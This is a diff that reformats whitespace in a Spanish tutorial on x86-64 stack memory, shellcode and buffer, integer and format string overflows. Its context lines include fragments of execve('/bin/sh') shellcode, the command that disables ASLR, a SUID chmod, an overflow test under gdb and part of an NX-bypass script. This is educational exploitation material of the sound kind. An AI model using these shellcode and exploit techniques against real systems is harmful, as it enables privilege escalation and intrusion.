@@ -42,27 +42,27 @@
 	La segmentación de la memoria de un programa se divide en varias regiones:
 
 				|-------------------|	Direcciones Altas (H o High)
-				|		   mas allá			|
+				|      mas allá	    |
 				|-------------------|
-				|										|
-				|				stack				|
+				|                   |
+				|       stack       |
 				|-------------------|
-				|										|
-				|										|
-				|		 			...				|
-				|										|
+				|		    |
+				|		    |
+				|         ...       |
+				|		    |
 				|-------------------|
-				|										|
-				|		 		heap				|
+				|		    |
+				|	 heap       |
 				|-------------------|
-				|										|
-				|				.bss				|
+				|	            |
+				|	.bss        |
 				|-------------------|
-				|										|
-				|				.data				|
+				|		    |
+				|       ,data       |
 				|-------------------|
-				|										|
-				|				.text				|
+				|		    |
+				|       .text       |
 				|-------------------|	Direcciones Bajas (L o Low)
 
 					Fig 1 - Memoria
@@ -100,22 +100,22 @@ en el stack (implementación Full stack) o a la siguiente dirección libre en el
 (implementación Empty stack).
 
 		--------------		--------------		--------------		--------------
-		|	  	...		 |		|	  	...	 	 |		|		  ...	 	 |		|	  	...		 |
+		|     ...    |		|     ...    |		|     ...    |		|     ...    |
 		|------------|		|------------|		|------------|		|------------|
-		|	  	...		 |		|		  ...	 	 |		|		  ...		 |SP->|	  ...			 |
+		|     ...    |		|     ...    |		|     ...    |      SP->|     ...    |
 		|------------|		|------------|		|------------|		|------------|
-		|    0x08 	 |SP->|    0x08 	 |		|    0x08 	 |		|    0x08 	 |
+		|    0x08    |	    SP->|    0x08    |		|    0x08    |		|    0x08    |
 		|------------|		|------------|		|------------|		|------------|
-		|	 	 0x07	 	 |		|	 	 0x07 	 |		|	 	 0x07 	 |		|	 	 0x07 	 |
+		|    0x07    |		|    0x07    |		|    0x07    |		|    0x07    |
 		|------------|		|------------|		|------------|		|------------|
-SP->|	 	 0x06 	 |		|		 0x06 	 |		|		 0x06 	 |		|		 0x06 	 |
+	    SP->|    0x06    |		|    0x06    |		|    0x06    |		|    0x06    |
 		|------------|		|------------|		|------------|		|------------|
-		|	  	...		 |		|		  ...	 	 |SP->|	  	...	 	 |		|	  	...		 |
+		|    ...     |		|     ...    |      SP->|    ...     |		|     ...    |
 		|------------|		|------------|		|------------|		|------------|
-		|	  	...		 |		|	  	...		 |		|		  ...		 |		|	  	...		 |
+		|    ...     |		|     ...    |		|    ...     |		|     ...    |
 		|------------|		|------------|		|------------|		|------------|
-				full 							full 							empty 						empty
-		descendente 				ascendente	 			descendente 			ascendente
+		    full 		     full 		    empty 		     empty
+		descendente 		ascendente	 	descendente 		ascendente
 
 					Fig 2 - Tipos de implementación del stack.
 
@@ -131,28 +131,28 @@ una función y se popean al finalizarla.
 genera una estructura de datos dentro del stack, llamada stack frame. Un stack frame
 es una porción de memoria dedicada para una sub-rutina específica.
 
-								|-------------------|	Direcciones Altas (H o High)
-								|										|
-								|	 		stack frame		|
-								|	   	anterior 			|
-								|										|
-								|-------------------|
-						----|										|
-						|		|	  	argumentos		|
-						|		|-------------------|
-						|		| 	 instruction		|
-						|		|	   pointer	(IP)	|
-						|		|-------------------|
-	 Stack<---|		| frame base pointer|
-	 Frame		|		| 		 	(BP)				|
-						|		|-------------------|
-						|		|										|
-						|		| espacio reservado	|
-						|		|				para				|
-						|		| variables locales	|
-						----|										|
-								|-------------------|
-								|										|	Direcciones Bajas (L o Low)
+				|-------------------|	Direcciones Altas (H o High)
+				|		    |
+				|    stack frame    |
+				|     anterior 	    |
+				|                   |
+                                |-------------------|
+			   |----|		    |
+			   |	|    argumentos	    |
+			   |	|-------------------|
+		           |	|    instruction    |
+			   |	|     pointer (IP)  |
+			   |	|-------------------|
+	 	  Stack<---|	| frame base pointer|
+	  	  Frame	   |	| 	(BP)	    |
+			   |	|-------------------|
+			   |	|		    |
+			   |	| espacio reservado |
+			   |	|	para	    |
+			   |	| variables locales |
+		           |----|                   |
+				|-------------------|
+				|		    |	Direcciones Bajas (L o Low)
 
 			Fig 3 - Dos stack frames contiguos.
 
@@ -202,7 +202,7 @@ del stack, por lo que el stack restaura su valor antes del prólogo. Regresa a l
 función que la invocó, haciéndo pop del registro IP del stack frame anterior en el
 stack y saltando hacia la dirección que contiene.
 
-	mov		esp,ebp
+	mov	esp,ebp
 	pop 	ebp
 	ret
 
@@ -219,21 +219,19 @@ de datos que ambas manejan. Los procesadores de 32 bits poseen 8 registros de pr
 general y cada registro tiene una longitud de 32 bits. Los procesadores de 64 bits
 poseen 16 registros de propósito general y cada registro tiene una longitud de 64 bits.
 
-						|----------------------------------------------------------------|
-	64 bits 	|														 	RAX																 |
-						|----------------------------------------------------------------|
+			|----------------------------------------------------------------|
+	64 bits 	|				RAX				 |
+			|----------------------------------------------------------------|
 
-												 										|--------------------------------|
-																	32 bits		|							 EAX							 |
-																						|--------------------------------|
+							|--------------------------------|										32 bits		|		EAX		 |
+							|--------------------------------|
 
-																														|----------------|
-																									16 bits 	|				AX			 |
-																														|----------------|
+									|----------------|												16 bits 	|	AX	 |
+									|----------------|
 
-																														|-------||-------|
-																									8 bits 		|   AH	||  AL	 |
-																														|-------||-------|
+									|-------||-------|
+							8 bits 		|   AH	||  AL	 |
+									|-------||-------|
 
 En 64 bits ésta estructura la encontramos en los siguientes registros:
 RAX = Acumulador, RCX = Contador, RDX = Datos, RBX = Base, RSP = Stack Pointer,
@@ -325,7 +323,7 @@ Address Space Layout Randomization (ASLR o Aleatoriedad en la disposición del e
 de direcciones) es un mecanismo que ordena aleatoriamente el espacio de direcciones de
 un programa.
 
-[*]	Desactivado: 			$ echo 0 > /proc/sys/kernel/randomize_va_space
+[*]	Desactivado: 		$ echo 0 > /proc/sys/kernel/randomize_va_space
 [*] Activado(por defecto): 	$ echo 1 > /proc/sys/kernel/randomize_va_space
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -348,12 +346,12 @@ ejecutable:
 	$ readelf -l aplicacion_vulnerable
 
 GNU_STACK      	0x0000000000000000 0x0000000000000000 0x0000000000000000
-								0x0000000000000000 0x0000000000000000  RW     0x10
-									NO EJECUTABLE
+		0x0000000000000000 0x0000000000000000  RW     0x10
+		 NO EJECUTABLE
 
 GNU_STACK      	0x0000000000000000 0x0000000000000000 0x0000000000000000
-								0x0000000000000000 0x0000000000000000  RWE    0x10
-									EJECUTABLE
+		0x0000000000000000 0x0000000000000000  RWE    0x10
+		 EJECUTABLE
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
@@ -460,9 +458,9 @@ Con éste criterio podemos cambiar los permisos:
 	$ chmod 4777 archivo
 
 1) el tipo de archivo tiene el bit SUID seteado (superusuario)	(4)
-2) el propietario puede leer/escribir/ejecutar 					(7)
-3) el grupo puede leer/escribir/ejecutar 						(7)
-4) otros pueden leer/escribir/ejecutar 							(7)
+2) el propietario puede leer/escribir/ejecutar 			(7)
+3) el grupo puede leer/escribir/ejecutar 			(7)
+4) otros pueden leer/escribir/ejecutar 				(7)
 
 Confirme los cambios usando:
 
@@ -529,10 +527,10 @@ ejecutar.c
 	$ (gdb) disassemble main
 
 	Dump of assembler code for function main:
-	   0x0000000000400aae <+0>:		push   rbp
-	   0x0000000000400aaf <+1>:		mov    rbp,rsp
-	   0x0000000000400ab2 <+4>:		mov    edx,0x0
-	   0x0000000000400ab7 <+9>:		mov    esi,0x0
+	   0x0000000000400aae <+0>:	push   rbp
+	   0x0000000000400aaf <+1>:	mov    rbp,rsp
+	   0x0000000000400ab2 <+4>:	mov    edx,0x0
+	   0x0000000000400ab7 <+9>:	mov    esi,0x0
 	   0x0000000000400abc <+14>:	lea    rdi,[rip+0x88a41]        # 0x489504
 	   0x0000000000400ac3 <+21>:	call   0x432400 <execve>
 	   0x0000000000400ac8 <+26>:	mov    eax,0x0
@@ -543,9 +541,9 @@ ejecutar.c
 	(gdb) disas execve
 
 	Dump of assembler code for function execve:
-	   0x0000000000432400 <+0>:		mov    eax,0x3b
-	   0x0000000000432405 <+5>:		syscall
-	   0x0000000000432407 <+7>:		cmp    rax,0xfffffffffffff001
+	   0x0000000000432400 <+0>:	mov    eax,0x3b
+	   0x0000000000432405 <+5>:	syscall
+	   0x0000000000432407 <+7>:	cmp    rax,0xfffffffffffff001
 	   0x000000000043240d <+13>:	jae    0x435ef0 <__syscall_error>
 	   0x0000000000432413 <+19>:	ret
 	End of assembler dump.
@@ -565,13 +563,13 @@ La llamada a execve() comienza aquí, se cargan en orden inverso los argumentos
 que se van a pasar a execve en los registros EDX, RSI, RDI.
 
 
-	   0x0000000000400ab2 <+4>:		mov    edx,0x0
+	   0x0000000000400ab2 <+4>:	mov    edx,0x0
 
 Setea el registro EDX en 0 (NULL).
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-	   0x0000000000400ab7 <+9>:		mov    esi,0x0
+	   0x0000000000400ab7 <+9>:	mov    esi,0x0
 
 Setea el registro ESI en 0 (NULL). (los primeros 32 bits del registro RSI)
 
@@ -598,14 +596,14 @@ Se llama a la función execve(), la instrucción call hace push de IP en el stac
 Dentro de la función execve:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-	   0x0000000000432400 <+0>:		mov    eax,0x3b
+	   0x0000000000432400 <+0>:	mov    eax,0x3b
 
 Copia 0x3b (59 decimal) en EAX. Este es el ID en el vector de interrupciones de
 linux de execve (linux system call tables).
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-	   0x0000000000432405 <+5>:		syscall
+	   0x0000000000432405 <+5>:	syscall
 
 syscall es una instrucción especial de intel que reemplaza a la
 instrucción del de vector de interrupciones 'int 0x80' y sirve
@@ -614,7 +612,7 @@ se almacena en el registro RAX.
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-	   0x0000000000432407 <+7>:		cmp    rax,0xfffffffffffff001
+	   0x0000000000432407 <+7>:	cmp    rax,0xfffffffffffff001
 
 Se pregunta si el valor contenido en el registro ReturnAX es igual a fffffffffffff001.
 
@@ -704,29 +702,24 @@ _start: y en otros basta solamente con escribir main: y empezar a codear.
 global _start
 
 _start:
-	mov 	edx, 0x0 								; Setear en 0 el registro EDX
-	mov 	esi, 0x0 								; Setear en 0 el registro ESI
+	mov 	edx, 0x0 			; Setear en 0 el registro EDX
+	mov 	esi, 0x0 			; Setear en 0 el registro ESI													; Necesitamos un puntero que apunte a
+						; la cadena "/bin/sh"
+	mov     qword rbx, '/bin/sh' 		; Cargamos en RBX la cadena '/bin/sh'
+  	push    rbx 				; Push al stack, RSP apunta a la cima
+    						; del stack
+  	mov 	rdi, rsp 			; Cargamos en RDI el valor al que
+    						; apunta RSP ( que es la dirección
+    						; donde se encuentra la cadena )
+	mov 	eax, 0x3b 			; Cargamos 59 en el registro EAX
+	syscall 				; Invocamos la syscall y retornará
+						; un valor en RAX
 
-																; Necesitamos un puntero que apunte a
-																; la cadena "/bin/sh"
-
-	mov     qword rbx, '/bin/sh' 	; Cargamos en RBX la cadena '/bin/sh'
-  push    rbx 									; Push al stack, RSP apunta a la cima
-    														; del stack
-
-  mov 	rdi, rsp 								; Cargamos en RDI el valor al que
-    														; apunta RSP ( que es la dirección
-    														; donde se encuentra la cadena )
-
-	mov 	eax, 0x3b 							; Cargamos 59 en el registro EAX
-	syscall 											; Invocamos la syscall y retornará
-																; un valor en RAX
-
-																; Iniciamos la salida
-	xor 	rax, rax 								; Por las dudas limpiamos RAX
-	mov 	rdi, 0x1 								; Setear en 1 el registro RDI
-	mov 	eax, 0x3c 							; Cargar 60 en el registro EAX
-	syscall 											; Invocamos la syscall
+						; Iniciamos la salida
+	xor 	rax, rax 			; Por las dudas limpiamos RAX
+	mov 	rdi, 0x1 			; Setear en 1 el registro RDI
+	mov 	eax, 0x3c 			; Cargar 60 en el registro EAX
+	syscall 				; Invocamos la syscall
 
 
 Entonces si creamos un archivo llamada.asm con éste contenido y la compilamos y
@@ -801,8 +794,8 @@ posibles que terminarán siendo lo mismo:
 		a la derecha. Cómo estoy en little-endian el shift se le aplica al
 		byte '/'
 				Por ejemplo:
-									mov 	qword rbx, '//bin/sh/'
-									shr     rbx, 0x8
+						mov 	qword rbx, '//bin/sh/'
+						shr     rbx, 0x8
 
 	[*] Escribir la cadena en ascii en formato little endian con un byte agregado y
 		shiftearlo un byte a la derecha.
@@ -819,12 +812,12 @@ little-endian = 'hs/nib/' = 68 73 2f 6e 69 62 2f
 Agregamos un byte más a la cadena para que esa posición no quede nula,
 68 73 2f 6e 69 62 2f 2f = 'hs/nib//' y las nuevas instrucciones son:
 
-	mov     qword rbx, '/bin/sh' 				mov 		rbx, 0x68732f6e69622f2f
-  push    rbx 												shr		 	rbx, 0x8
-  mov 		rdi, rsp										push    rbx
-    																	mov     rdi, rsp
-
-      	VIEJO																NUEVO
+	mov     qword rbx, '/bin/sh' 			mov 	rbx, 0x68732f6e69622f2f
+  	push    rbx					shr	rbx, 0x8
+  	mov	rdi, rsp				push    rbx
+    							mov     rdi, rsp
+							
+      	VIEJO						  NUEVO
 
 Después de hacer shift a la derecha el registro RBX queda así 0x68732f6e69622f,
 no se agregaron caracteres nulos a los opcodes y tenemos la cadena '/bin/sh' en
@@ -841,8 +834,8 @@ _start:
 	xor 	edx, edx
 	xor 	esi, esi
 
-  mov     rbx, 0x68732f6e69622f2f
-  shr     rbx, 0x8
+  	mov     rbx, 0x68732f6e69622f2f
+  	shr     rbx, 0x8
 	push    rbx
 	mov     rdi, rsp
 
@@ -851,7 +844,7 @@ _start:
 
 	xor 	rax, rax
 	push	0x1
-	pop		rdi
+	pop	rdi
 	mov 	al, 0x3c
 	syscall
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -886,7 +879,7 @@ global _start
 
 _start:
     mov     rbx, 0x68732f6e69622f2f     ; Cargar en RBX la cadena '//bin/sh'
-    shr     rbx, 0x8 										; Shift-right y la cadena es '/bin/sh'
+    shr     rbx, 0x8 			; Shift-right y la cadena es '/bin/sh'
     push    rbx                         ; push rbx
                                         ; ahora el stack pointer apunta a '/bin/sh'
     push    rsp                         ; push del stack pointer
@@ -938,8 +931,8 @@ encuentran las variables globales o puede compilar con el indicador
 tenemos que cargar 0x3b al registro AL podemos hacerlo cargando 0x13b al registro RAX
 y decrementando (en éste ejemplo, también se puede incrementar) un bit al registro AH.
 
-		0x13B	= 1 0011 1011 			mov     rax, 0x13b
-		0x3b	= 0 0011 1011 			dec     ah
+	0x13B	= 1 0011 1011 			mov     rax, 0x13b
+	0x3b	= 0 0011 1011 			dec     ah
 
 El incremento/decremento de un bit se lee de derecha a izquierda.
 O cargar por ejemplo en RAX el valor 0x33 y sumarle 0x8 para tener 0x3b en el registro.
@@ -960,12 +953,12 @@ instrucción es un byte más pequeña que la instrucción XOR.
 temporal, puede ser una variable local/global/estática y posee las siguientes
 características:
 
-	[*]	Espacio: es la memoria en donde se guarda la información almacenada en el
-		buffer
+	[*] Espacio: es la memoria en donde se guarda la información almacenada en el
+	     buffer
 	[*] Dirección: indica en donde está el espacio
 	[*] Dimensión: indica el tamaño del espacio
 	[*] Índice o particiones: indica cómo se reparte la información almacenada en el
-		buffer
+	     buffer
 
 Se produce un desbordamiento en el buffer cuando la dimensión del buffer es
 insuficiente para almacenar la información que se le asigna y ésto provoca que el
@@ -1023,20 +1016,20 @@ registro BP, para sobreescribir el total de BP se necesitarán 5+4 = 9 bytes y p
 sobreescribir el total del registro IP y controlar la dirección de retorno se necesitan
 9 + 4 = 13 bytes.
 
-					|										|
-					|-------------------|
-					| 	 instruction		|
-					|	   pointer	(IP)	|
-					|-------------------|
-					| frame base pointer|
-					| 		 (BP)					|
-					|-------------------|
-					|[1] [2] [3] [4] [5]|
-					| X	X X8 bytesX X[0]|
-					| X X X X X X X X X	|
-					|-------------------|
-					|										|
-									Fig 4
+			|		    |
+			|-------------------|
+			|    instruction    |
+			|      pointer (IP) |
+			|-------------------|
+			| frame base pointer|
+			| 	(BP)	    |
+			|-------------------|
+			|[1] [2] [3] [4] [5]|
+			| X X X8 bytesX X[0]|
+			| X X X X X X X X X |
+			|-------------------|
+			|                   |
+				Fig 4
 
 La figura 4 representa un stack frame que guarda un buffer de 5 bytes en sus variables
 locales. Una vez que se escriban los 5 bytes del buffer, se empezará a sobreescribir
@@ -1110,17 +1103,17 @@ cambie y se ejecute otra instrucción.
 Lo compilamos y lo debuggeamos:
 
 	$ gcc -g ejemplo1.c -o programa
-	$ gdb -q programa 						#el indicador -q para un inicio limpio
+	$ gdb -q programa 			#el indicador -q para un inicio limpio
 
 	[Ctrl+L] clear screen.
 
 	$ (gdb) set disassembly-flavor intel	#usado para mostrar el código maquina con
-											#notación intel en lugar de at&t
+						#notación intel en lugar de at&t
 
-	$ (gdb) run 							#corremos el programa para que se cargue
-											#en memoria
+	$ (gdb) run 				#corremos el programa para que se cargue
+						#en memoria
 
-	$ (gdb) disas main 						#muestra el código maquina
+	$ (gdb) disas main 			#muestra el código maquina
 
 	Dump of assembler code for function main:
 
@@ -1162,7 +1155,7 @@ funciones que no verifican los límites en los argumentos, más precisamente el 
 código de fantasía:
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		vulnerable.c
+	vulnerable.c
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	#include <stdio.h>
 	#include <string.h>
@@ -1205,7 +1198,7 @@ justo después de haber ejecutado la función strcpy() en la línea print del co
 del buffer, y lo observamos después:
 
 	$ gdb vuln
-	$ (gdb) b 12 						# breakpoint en el print del buffer
+	$ (gdb) b 12 				# breakpoint en el print del buffer
 	$ r $(python -c 'print "A" * 300') 	# corremos el programa desbordándolo
 
 	Breakpoint 1, main (argc=2, argv=0x7fffffffe098) at vulnerable.c:12
@@ -1308,7 +1301,7 @@ voy a usar un fragmento de código del libro Hacking: The Art of Exploitation,
 2nd Edition:
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		getenvaddr.c
+	getenvaddr.c
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 #include <stdio.h>
@@ -1378,17 +1371,17 @@ tipo.
 		--------------------------------------------------------------
 
 		char  		1 byte 			signed: -128 a 127
-													unsigned: 0 a 255
+							unsigned: 0 a 255
 
 		short 		2 bytes 		signed: -32768 a 32767
-													unsigned: 0 a 65535
+							unsigned: 0 a 65535
 
 		int/long 	4 bytes 		signed: -2147483648 a 2147483647
-													unsigned: 0 a 4294967295
+							unsigned: 0 a 4294967295
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		integerOverflow.c
+	integerOverflow.c
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #include <stdio.h>
 #include <stdlib.h>
@@ -1548,7 +1541,7 @@ Vamos a escribir un código en python que escriba en un archivo el relleno con l
 dirección de retorno que hay que sobreescribir y la dirección de la cadena en RDI.
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		nxPass.py
+	nxPass.py
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 from os import system
 from struct import pack
@@ -1564,7 +1557,7 @@ with open('mecanismo', 'w') as archivo:
 
 pack nos devuelve una cadena que contiene las direcciones comprimidas con el formato
 "Q" (long long int con signo -9.223.372.036.854.775.807 a 9.223.372.036.854.775.807).
-Se usa para convertir direcciones de 64 bits en little endian.
+Se usa para convertir las direcciones.
 
 	$ python nxPass.py
 
@@ -1597,7 +1590,7 @@ en una representación de cadena legible para humanos. Se producen cuando la apl
 evalúa los datos enviados de una cadena de entrada como un comando. Por ejemplo:
 
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 		formatString.c
+ 	formatString.c
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	#include <stdio.h>
 	#include <stdlib.h>
